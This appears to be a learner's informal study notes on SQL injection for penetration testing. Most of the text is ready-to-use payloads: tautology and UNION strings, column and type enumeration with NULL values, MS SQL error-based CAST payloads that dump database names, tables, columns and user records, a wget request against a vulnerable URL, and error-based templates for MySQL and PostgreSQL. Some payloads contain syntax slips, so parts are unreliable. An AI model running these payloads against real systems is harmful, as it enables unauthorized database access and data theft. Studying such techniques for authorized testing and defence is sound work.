sql sintax

select [colunmlist] from [table] where [condition]

UNION = it performs an UNION of different SELECT statements. it implies DINSTINCT by default. 
DISTINCT = remove the duplicates

how to comments lines on SQL ?
hashtag # 
two dashes --  followed by space

commong forms to exploit the SQLi:

' OR 'a'='a

' UNION SELECT Username, Password from Accounts WHERE 'a'='a

what can we do with an SQLi attack ?

-read file system
-run OS commands 
-install shells
-access remote network & more

SQLi classifications:
-scope of the attack
-exploitation vector
-source of the attack

types

in-band = it is exploited by using the same channel to retrieve the data
error-based = it is exploited by forcing the DBMS to output errors
blind = there's no output and it is exploited by an inference exploitation, mostly by true/false conditions.
to understand the true/false responses, it is needed to study the webapp behavior.

C O N D I T I O N S / BOOLEAN BASED DETECTIONS = needed when there's no output. 

' OR '1'='1 ==> TRUE
' OR '1'='2 ==> FALSE

a good trick to exploit SQLi is to use "Comments" [# or --]

ENUMERATING the number of fields in a query
we can start injecting the null value in order to build a valid query.
sample:

9999 UNION SELECT NULL; -- -
9999 UNION SELECT NULL, NULL; -- -
9999 UNION SELECT NULL, NULL, NULL; -- -

and so on, only add the NULL value to create a valid query and the error dissapear. 

BLIND ENUMERATING SCENARIO

- it is needed to start with a valid ID in order to enumerate the fields in a query.
when nothing is displayed, it possible means there's something bad with the query. when the content is displayed, it means you found
the number of parameters. 

- enumerate the type of the fields
when enumerating the type of field and the type enforcing is enabled it will trigger an error.
engines with type enforcing enabled:
->PostgreSQL = YES
->MS SQL SERVER = YES
->ORACLE = YES
->MySQL = NO

> enumerate field types

cyclical process
steps:
1.substitute one of the null fields in our payload with a constant
if the constant is correct, it will work, if not, it will throw an error.

sample: after finding the in-band valid query, there's a way to validate the type.

' UNION SELECT 1, null; -- -

it will try to check for integer the first field. (if there's no error, it means the field is integer) the same process can be repeated to check for the field type.

> error based explotation

most of the times the error is reflected in the web application output, but could be also embedded in an email, appended to a log file, etc. 

MS SQL Sever reveals the name of the database objects within error messages. 

schemas are databases with the singular purpose of describing all the other user-defined databases in the system.

"sa" is the superadmin for MS SQL Server and has access to the master database. master contains schemas of user defined databases.

first thing to know: database version, that to build the exploits accordingly.
most used trick is to "trigger a type conversion error" 
payload for this technique:

9999999 or 1 in (SELECT TOP 1 CAST (<FIELDNAME> as varchar(4096)) from <TABLENAME> WHERE <FIELDNAME> NOT IN (<LIST>)); --

when we want the second select to be executed, it is needed that the first condition will be "false"

the section "or 1 in" will help to trigger the error, with this command we are asking the database to look for integer value 1 within a varchar column. 

...CASTING
CAST (<FIELDNAME> as varchar(4096))
the fieldname section is where we insert the column that we want to dump. either a column of a user-defined databse or a special database column). the fieldname can also be a SQL function, user_name() or a variable like @@version. (check pentest monkey cheat)

find current databse user: if the user retrieved is not the admin user, we still can retrieve the databases owned by the same user. 

9999 or 1 in (SELECT TOP 1 CAST(user_name() as varchar(4086))) --

retrieve databases: to do that, it is needed to iterate through the MASTER database to find all the databases that we can read. 

payload:  9999 or 1 in (SELECT TOP 1 CAST(db_name(0) as varchar(4096))) -- 

db_name() function, accesses the master..sysdatabases table which stores all the databases installed on the server. it will access the databases that the user founded has access. to enumerate all of them it is needed to increment the db_name() argument from 0 to X number until it is not more dbs.

enumerate all tables in the current database or other databases:  
payload:

9999 or 1 in (SELECT TOP 1 CAST(name as varchar(4096))) FROM <database name>..sysobjects WHERE xtype='U' and name NOT IN (<known table list>)); --

xtype='U' = means that we are only interested in user-defined tables
name NOT IN = name is a column of the "sysobjects" special table. every time we find a new table we will append it to the NOT IN list. needed because the error displays only the first table name

enumerating the columns:

payload: 
9999 or 1 in (SELECT TOP 1 CAST (<database name>..syscolumns.name as varchar(4096)) FROM <database name>..syscolumns,<database name>..sysobjects WHERE <database name>..syscolumns.id=<database name>..sysobjects.id AND <database name>..sysobjects.name=<table name for analysis> AND <database name>..syscolumns.name NOT IN (<known column list>)); --

<known column list> = means the list of the columns we already retrieved

dumping

dump the data doing schema enumeration
payload:

9999 or 1 in (SELECT TOP 1 CAST (<column name> as varchar(4096)) FROM <db name>..<table name> WHERE <column name> NOT IN (<retrieved data list>)); -- -

to force or ensure the selected parameter has data type "varchar" exist a trick to add a concatenation: 2%bchar(64) | 2%b

payload: this payload will help to force the error (values: id, cms, users)

9999 or 1 in (SELECT TOP 1 CAST (id as varchar)%2char(64) FROM cms..users WHERE id NOT IN ('')); -- -

-> %2b = it means to sent the value/symbol + to the DBMS, the character "+" means concatenation.

getting all ID's now, the other columns can be extracted, for example, "users"

9999 or 1 in (SELECT TOP 1 CAST (username as varchar) FROM cms..users WHERE id=1); -- -

9999 or 1 in (SELECT TOP 1 CAST ("column name" as varchar) FROM cms..users WHERE id=1); -- -

this information can be retrieved using wget tool, like the following:

wget "vulnerable URL"/products.php?id=1 or 1 IN (SELECT TOP 1 CAST(db_name() as varchar(4096))) --" -q -O -

SQLi exploitation using "group by" statement::

in case there's repeated values, the group by statement will remove duplicates.

MySQL skeleton to create error-based injections:

select 1, 2 union select count(*), concat(<information to extract>,floor(rand(0)*2)) as x from information_schema.tables group by x;

extract database version on MySQL:
SELECT count(*), concat(version(), floor(rand(0)*2)) as x from information_schema.tables group by x;

POSTGRE ERROR BASED

technique/command: 

...> get version

SELECT CAST(version()) as numeric);

...> get tables

SELECT CAST((SELECT table_name from information_schema.tables limit 1 offset 0) as numeric);

NOTE: to get all tables it is needed to change/modify the "offset" section from 0 to X number.
